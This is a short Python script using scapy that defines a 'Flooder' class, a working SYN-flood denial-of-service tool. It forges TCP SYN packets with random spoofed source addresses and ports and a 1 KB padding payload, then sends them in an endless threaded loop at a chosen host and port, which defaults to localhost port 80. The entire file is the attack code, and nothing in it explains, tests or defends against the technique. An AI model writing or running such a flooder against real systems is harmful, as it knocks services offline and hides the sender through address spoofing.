from scapy.all import IP, TCP, Raw, send, RandIP, RandShort
import threading

class Flooder:
    def __init__(self, dest_ip, dest_port):
        self.dest_ip = dest_ip
        self.dest_port = dest_port
        self.packet = self.create_syn_packet()
        self.stop_event = threading.Event()


    def create_syn_packet(self):
        # Generate random source ip and port
        src_ip = RandIP('192.168.1.1/24')
        src_port = RandShort()

        ip = IP(src=src_ip, dst=self.dest_ip)
        tcp = TCP(sport=src_port, dport=self.dest_port, flags='S')
        raw = Raw(b'x' * 1024) # Flooding data (1kb)
        
        # Stack the layers
        return ip / tcp / raw
    
    
    def flood(self):
        while not self.stop_event.is_set():
            send(self.packet, verbose=0)
        
        # Reset stopping trigger
        self.stop_event.clear()


    def start(self):
        t = threading.Thread(target=self.flood)
        t.start()

    def stop(self):
        self.stop_event.set()

    # def __del__(self):
    #     print('i was garbage collected!')


if __name__ == '__main__':
    HOST = '127.0.0.1'
    PORT = 80
    
    flooder = Flooder(HOST, PORT)
    flooder.start()